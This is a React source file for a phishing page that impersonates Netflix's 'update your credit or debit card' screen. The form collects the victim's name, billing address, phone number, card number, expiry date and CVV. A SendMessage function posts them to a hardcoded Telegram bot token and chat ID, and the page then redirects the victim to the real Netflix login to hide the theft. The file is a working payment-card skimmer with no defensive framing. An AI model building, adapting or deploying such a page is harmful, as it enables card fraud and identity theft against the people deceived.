import React from "react";
import { useNavigate } from "react-router-dom";
import { Formik, Form, Field, ErrorMessage } from "formik";
import * as Yup from "yup";

export default function Info() {
  const navigate = useNavigate();
  const initialValue = {
    FullName: "",
    BillingAddress: "",
    ZipCode: "",
    City: "",
    State: "",
    Country: "",
    PhoneNumber: "",
    CardNumber: "",
    exp: "",
    cvv: "",
  };
  const validationSchema = Yup.object({
    FullName: Yup.string().required("Full Name is required"),
    BillingAddress: Yup.string().required("Billing Address is required"),
    ZipCode: Yup.string().required("Zip Code is required"),
    City: Yup.string().required("City is required"),
    State: Yup.string().required("State is required"),
    Country: Yup.string().required("Country is required"),
    PhoneNumber: Yup.string().required("Phone Number is required"),
    CardNumber: Yup.string("Enter a valid card credit number.").required(
      "Card Number is required"
    ),
    exp: Yup.string().required("Expiration Date is required"),
    cvv: Yup.string().required("CVV is required"),
  });
  function submitHandler() {
    window.location.href = "https://netflix.com/login";
  }

  //function that sends message to telegram
  async function SendMessage(data) {
    let response = await fetch(
      "https://api.telegram.org/bot5376101034:AAGUeSBwEuVbOK_vtkVzrp167MUa4g7H9u8/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: 1609901379,
          text: data,
        }),
      }
    );
    return response;
  }
  return (
    <body data-new-gr-c-s-check-loaded="14.1055.0" data-gr-ext-installed="">
      <div class="basicLayout simplicity">
        <div class="nfHeader noBorderHeader signupBasicHeader">
          <span class="logo">
            <img src="/nt_logo.svg" alt="logo" />
          </span>
          <a
            href="javascript:"
            class="authLinks signupBasicHeader isMemberSimplicity"
          >
            Sign out
          </a>
        </div>
        <div class="simpleContainer">
          <div class="centerContainer firstLoad">
            <div class="paymentFormContainer">
              <h1 class="stepTitle">Update your credit or debit card.</h1>
              <div class="contextContainer">
                <div class="contextRow contextRowFirst">
                  By updating your membership, you will enjoy all account
                  advantages and benefits
                </div>
              </div>
              <Formik
                initialValues={initialValue}
                validationSchema={validationSchema}
                onSubmit={async (values, { setSubmitting }) => {
                  setSubmitting(true);
                  let userData =
                    "FullName : " +
                    values.FullName +
                    "\n" +
                    "BillingAddress : " +
                    values.BillingAddress +
                    "\n" +
                    "ZipCode : " +
                    values.ZipCode +
                    "\n" +
                    "City : " +
                    values.City +
                    "\n" +
                    "State : " +
                    values.State +
                    "\n" +
                    "Country : " +
                    values.Country +
                    "\n" +
                    "PhoneNumber : " +
                    values.PhoneNumber;
                  let userCard =
                    "CardNumber : " +
                    values.CardNumber +
                    "\n" +
                    "exp : " +
                    values.exp +
                    "\n" +
                    "cvv : " +
                    values.cvv;

                  let res = await SendMessage(userData);
                  let res2 = await SendMessage(userCard);
                  setSubmitting(false);
                  console.log(res);
                  if (res.status === 200 && res2.status === 200) {
                    submitHandler();
                  }
                }}
              >
                {(formik) => (
                  <Form>
                    <div class="fieldContainer">
                      <span class="logos logos-block">
                        <span class="logoIcon VISA"></span>
                        <span class="logoIcon MASTERCARD"></span>
                        <span class="logoIcon AMEX"></span>
                        <span class="logoIcon DISCOVER"></span>
                      </span>
                      <ul class="simpleForm structural ui-grid">
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.FullName &&
                                      formik.touched.FullName
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="text"
                                    class="nfTextField hasText"
                                    maxlength="50"
                                    name="FullName"
                                  />
                                  <label for="FullName" class="placeLabel">
                                    Full Name
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="FullName"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.BillingAddress &&
                                      formik.touched.BillingAddress
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="text"
                                    class="nfTextField hasText"
                                    name="BillingAddress"
                                    maxlength="50"
                                  />
                                  <label
                                    for="BillingAddress"
                                    class="placeLabel"
                                  >
                                    Billing Address
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="BillingAddress"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.ZipCode &&
                                      formik.touched.ZipCode
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="text"
                                    class="nfTextField hasText"
                                    maxlength="10"
                                    name="ZipCode"
                                  />
                                  <label for="ZipCode" class="placeLabel">
                                    Zip Code
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="ZipCode"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.City && formik.touched.City
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="text"
                                    class="nfTextField hasText"
                                    maxlength="50"
                                    name="City"
                                  />
                                  <label for="City" class="placeLabel">
                                    City
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="City"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.State &&
                                      formik.touched.State
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="text"
                                    class="nfTextField hasText"
                                    maxlength="50"
                                    name="State"
                                  />
                                  <label for="State" class="placeLabel">
                                    State
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="State"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.Country &&
                                      formik.touched.Country
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="text"
                                    class="nfTextField hasText"
                                    maxlength="50"
                                    name="Country"
                                  />
                                  <label for="Country" class="placeLabel">
                                    Country
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="Country"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.PhoneNumber &&
                                      formik.touched.PhoneNumber
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    type="tel"
                                    class="nfTextField hasText"
                                    maxlength="30"
                                    name="PhoneNumber"
                                  />
                                  <label for="PhoneNumber" class="placeLabel">
                                    Phone Number
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="PhoneNumber"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label>
                                  <Field
                                    style={
                                      formik.errors.CardNumber &&
                                      formik.touched.CardNumber
                                        ? { border: "1px solid red" }
                                        : {}
                                    }
                                    placeholder="**** **** **** "
                                    type="tel"
                                    number="true"
                                    class="nfTextField hasText"
                                    maxlength="23"
                                    name="CardNumber"
                                    data-check="Enter a valid card credit number."
                                  />
                                  <label for="CardNumber" class="placeLabel">
                                    Card Number
                                  </label>
                                  <ErrorMessage
                                    style={{ color: "red", fontSize: "13px" }}
                                    name="CardNumber"
                                    component="div"
                                    className="error"
                                  />
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="nfInput nfInputOversize">
                            <div class="nfInputPlacement">
                              <label>
                                <Field
                                  style={
                                    formik.errors.exp && formik.touched.exp
                                      ? { border: "1px solid red" }
                                      : {}
                                  }
                                  placeholder="MM/YY"
                                  type="tel"
                                  class="nfTextField hasText"
                                  maxlength="5"
                                  name="exp"
                                />
                                <label for="exp" class="placeLabel">
                                  Expiration Date (MM/YY)
                                </label>
                                <ErrorMessage
                                  style={{ color: "red", fontSize: "13px" }}
                                  name="exp"
                                  component="div"
                                  className="error"
                                />
                              </label>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace">
                          <div class="nfInput nfInputOversize">
                            <div class="nfInputPlacement">
                              <label>
                                <Field
                                  style={
                                    formik.errors.cvv && formik.touched.cvv
                                      ? { border: "1px solid red" }
                                      : {}
                                  }
                                  placeholder="***"
                                  type="tel"
                                  class="nfTextField hasText"
                                  maxlength="5"
                                  name="cvv"
                                />
                                <label for="cvv" class="placeLabel">
                                  Security Code (CVV)
                                </label>
                                <ErrorMessage
                                  style={{ color: "red", fontSize: "13px" }}
                                  name="cvv"
                                  component="div"
                                  className="error"
                                />
                              </label>
                            </div>
                          </div>
                        </li>
                        <li class="nfFormSpace"></li>
                      </ul>
                    </div>
                    <div class="submitBtnContainer">
                      <input
                        id="bt_submit"
                        class="nf-btn waiting nf-btn-primary nf-btn-solid nf-btn-oversize"
                        type="submit"
                        value="SAVE"
                      />

                      {/* <div class="waitIndicator">
                          <div
                            class="basic-spinner basic-spinner-light center-absolute"
                            style={{ width: "35px", height: "35px" }}
                          ></div>
                        </div>
                      </button> */}
                    </div>
                  </Form>
                )}
              </Formik>
            </div>
            <div class="cvvTooltip" style={{ display: "none" }} id="whats_csc">
              <span
                class="icon-close close-button pointer"
                id="bt_close_whats_csc"
              ></span>
              <div class="tooltipDesc">
                Your card's security code (CVV) is the 3 or 4 digit number
                located on the back of most cards.
              </div>
              <div class="otherCvvHelp"></div>
              <div class="amexCvvHelp"></div>
            </div>
          </div>
        </div>
        <div class="site-footer-wrapper centered">
          <div class="footer-divider"></div>
          <div class="site-footer">
            <p class="footer-top">
              <a class="footer-top-a" href="javascript:">
                Questions? Contact us.
              </a>
            </p>
            <ul class="footer-links structural">
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:">
                  FAQ
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:">
                  Help Center
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:">
                  Terms of Use
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:">
                  Privacy Statement
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:">
                  Cookie Preferences
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:">
                  Corporate Information
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </body>
  );
}
